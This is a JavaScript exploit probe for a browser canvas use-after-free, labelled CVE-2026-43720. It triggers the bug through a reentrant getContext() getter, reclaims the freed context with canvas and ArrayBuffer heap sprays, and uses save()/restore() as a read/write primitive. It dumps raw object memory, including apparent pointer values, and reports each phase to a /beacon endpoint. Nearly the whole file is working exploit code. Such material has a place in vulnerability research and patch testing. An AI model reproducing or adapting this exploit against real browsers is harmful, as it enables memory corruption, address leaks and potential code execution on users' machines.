// p464-canvas-save-marker.js — Canvas UAF save() marker probe
//
// Strategy: save() is ++m_unrealizedSaveCount, a simple uint32 increment
// at a fixed offset. No pointer dereference, no virtual dispatch.
// After AB spray reclaims the freed context slot, save() writes to AB data.
// We scan all ABs for the written value to identify the target AB + offset.
//
// CVE-2026-43720: reentrant getContext() UAF
(function() {
  var RUN = 'p464-' + Date.now().toString(36);
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag + '/' + RUN, false);
      x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
    } catch(e) {}
  }
  B('BOOT', navigator.userAgent);

  function triggerUAF() {
    var c = document.createElement('canvas');
    c.width = 1; c.height = 1;
    document.body.appendChild(c);
    var inner = null, tc = 0;
    var s = {};
    Object.defineProperty(s, 'desynchronized', {
      get: function() { tc++; if (tc === 1) inner = c.getContext('2d'); return false; }
    });
    var outer = c.getContext('2d', s);
    if (!inner || inner === outer) return null;
    return { innerCtx: inner, outerCtx: outer, canvas: c };
  }

  // === PHASE 1: Establish same-type aliasing ===
  try {
    var uaf = triggerUAF();
    if (!uaf) { B('SKIP', 'no UAF'); B('DONE', RUN); return; }

    var SPRAY_COUNT = 200;
    var sprayCanvases = [];
    var sprayCtxs = [];
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      document.body.appendChild(c);
      sprayCanvases.push(c);
      sprayCtxs.push(c.getContext('2d'));
      sprayCtxs[i].lineWidth = 700 + i;
    }

    var readLW = -1;
    try { readLW = uaf.innerCtx.lineWidth; } catch(e) { readLW = 'ERR'; }
    var aliasedIdx = (typeof readLW === 'number' && readLW >= 700) ? Math.round(readLW - 700) : -1;

    B('P1-ALIAS', { lw: readLW, idx: aliasedIdx });
    if (aliasedIdx < 0 || aliasedIdx >= SPRAY_COUNT) {
      B('P1-FAIL', 'no aliasing detected');
      B('DONE', RUN);
      return;
    }

    // Verify bidirectional
    uaf.innerCtx.lineWidth = 11111.5;
    var verified = (sprayCtxs[aliasedIdx].lineWidth === 11111.5);
    B('P1-VERIFY', { verified: verified });

    // === PHASE 2: Free the aliased context ===
    // Remove aliased spray canvas from DOM, null all JS refs
    var deadCanvas = sprayCanvases[aliasedIdx];
    if (deadCanvas.parentNode) deadCanvas.parentNode.removeChild(deadCanvas);
    sprayCanvases[aliasedIdx] = null;
    sprayCtxs[aliasedIdx] = null;
    deadCanvas = null;

    // Also free ALL other spray canvases to help GC and clear allocator
    for (var i = 0; i < SPRAY_COUNT; i++) {
      if (sprayCanvases[i]) {
        if (sprayCanvases[i].parentNode) sprayCanvases[i].parentNode.removeChild(sprayCanvases[i]);
        sprayCanvases[i] = null;
        sprayCtxs[i] = null;
      }
    }
    sprayCanvases = null;
    sprayCtxs = null;

    // Force GC aggressively
    for (var gc = 0; gc < 15; gc++) {
      var waste = [];
      for (var w = 0; w < 5000; w++) waste.push(new ArrayBuffer(128));
      waste = null;
    }

    B('P2-FREED', 'gc-done');

    // === PHASE 3: Spray ABs at multiple sizes ===
    // We don't know the exact CanvasRenderingContext2D size, so spray several
    var SIZES = [256, 384, 512, 640, 768, 1024, 1536, 2048, 3072, 4096];
    var PER_SIZE = 100;
    var abPool = [];

    for (var si = 0; si < SIZES.length; si++) {
      for (var j = 0; j < PER_SIZE; j++) {
        var ab = new ArrayBuffer(SIZES[si]);
        // Zero-initialize (default) — save() marker will stand out
        abPool.push({ ab: ab, size: SIZES[si], si: si, j: j });
      }
    }

    B('P3-SPRAYED', { count: abPool.length, sizes: SIZES });

    // === PHASE 4: Call save() exactly 42 times ===
    // Each call increments m_unrealizedSaveCount by 1
    // After 42 calls, the value at that offset = 42 (0x2A)
    var MARKER = 42;
    var saveOk = true;
    try {
      for (var s = 0; s < MARKER; s++) {
        uaf.innerCtx.save();
      }
    } catch(e) {
      saveOk = false;
      B('P4-CRASH', e.constructor.name + ': ' + e.message.slice(0, 200));
    }

    B('P4-SAVED', { marker: MARKER, ok: saveOk });

    if (!saveOk) {
      B('DONE', RUN);
      return;
    }

    // === PHASE 5: Scan all ABs for the marker value ===
    var hits = [];
    for (var pi = 0; pi < abPool.length; pi++) {
      var u32 = new Uint32Array(abPool[pi].ab);
      for (var off = 0; off < u32.length; off++) {
        if (u32[off] === MARKER) {
          // Found the marker! Record details
          var byteOff = off * 4;

          // Read surrounding context (8 bytes before and after, as hex)
          var u8 = new Uint8Array(abPool[pi].ab);
          var context = '';
          var start = Math.max(0, byteOff - 16);
          var end = Math.min(u8.length, byteOff + 20);
          for (var ci = start; ci < end; ci++) {
            context += ('0' + u8[ci].toString(16)).slice(-2);
          }

          // Read first 64 bytes of this AB (contains vtable, m_wrapper, etc.)
          var head = '';
          for (var ci = 0; ci < Math.min(64, u8.length); ci++) {
            head += ('0' + u8[ci].toString(16)).slice(-2);
          }

          // Read as float64 array for pointer values
          var f64 = new Float64Array(abPool[pi].ab);
          var ptrs = [];
          for (var fi = 0; fi < Math.min(16, f64.length); fi++) {
            // Convert float64 to hex to see raw pointer values
            var tmpBuf = new ArrayBuffer(8);
            new Float64Array(tmpBuf)[0] = f64[fi];
            var tmpU8 = new Uint8Array(tmpBuf);
            var hexVal = '';
            for (var hi = 7; hi >= 0; hi--) hexVal += ('0' + tmpU8[hi].toString(16)).slice(-2);
            ptrs.push(hexVal);
          }

          hits.push({
            poolIdx: pi,
            size: abPool[pi].size,
            byteOffset: byteOff,
            context: context,
            head64: head,
            ptrsHex: ptrs
          });

          if (hits.length >= 5) break;
        }
      }
      if (hits.length >= 5) break;
    }

    B('P5-SCAN', { hitCount: hits.length });

    if (hits.length > 0) {
      // Report each hit separately for maximum detail
      for (var hi = 0; hi < hits.length; hi++) {
        B('P5-HIT-' + hi, hits[hi]);
      }

      // === PHASE 6: If hit found, do a SECOND save to confirm ===
      try {
        uaf.innerCtx.save(); // now m_unrealizedSaveCount = 43
        var hit = hits[0];
        var u32check = new Uint32Array(abPool[hit.poolIdx].ab);
        var newVal = u32check[hit.byteOffset / 4];
        B('P6-CONFIRM', { expected: MARKER + 1, actual: newVal, confirmed: (newVal === MARKER + 1) });
      } catch(e) {
        B('P6-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
      }

      // === PHASE 7: Read the FULL AB as hex ===
      // This gives us the raw bytes of the CanvasRenderingContext2D object
      var hit0 = hits[0];
      var fullU8 = new Uint8Array(abPool[hit0.poolIdx].ab);

      // Send first 256 bytes in chunks
      for (var chunk = 0; chunk < 4; chunk++) {
        var start = chunk * 64;
        var hex = '';
        for (var ci = start; ci < Math.min(start + 64, fullU8.length); ci++) {
          hex += ('0' + fullU8[ci].toString(16)).slice(-2);
        }
        B('P7-DUMP-' + chunk, { offset: start, hex: hex });
      }

      // === PHASE 8: Write controlled data through save/restore ===
      // restore() when m_unrealizedSaveCount > 0 just decrements — also safe
      try {
        // Set to a specific value: save 100 more times, then restore to set a known state
        for (var s = 0; s < 100; s++) uaf.innerCtx.save();
        var afterSave = new Uint32Array(abPool[hit0.poolIdx].ab)[hit0.byteOffset / 4];

        uaf.innerCtx.restore(); // decrement
        var afterRestore = new Uint32Array(abPool[hit0.poolIdx].ab)[hit0.byteOffset / 4];

        B('P8-READWRITE', {
          afterSave: afterSave,
          afterRestore: afterRestore,
          delta: afterSave - afterRestore
        });
      } catch(e) {
        B('P8-ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
      }
    } else {
      B('P5-MISS', 'no marker found in any AB');

      // Diagnostic: check if innerCtx is still alive by trying save
      try {
        uaf.innerCtx.save();
        B('P5-DIAG', 'save succeeded but marker not in ABs — context not freed?');
      } catch(e) {
        B('P5-DIAG', 'save crashed: ' + e.message.slice(0, 100));
      }
    }

  } catch(e) {
    B('ERR', e.constructor.name + ': ' + e.message.slice(0, 200));
  }

  B('ALIVE', 'all-phases-completed');
  B('DONE', RUN);
})();
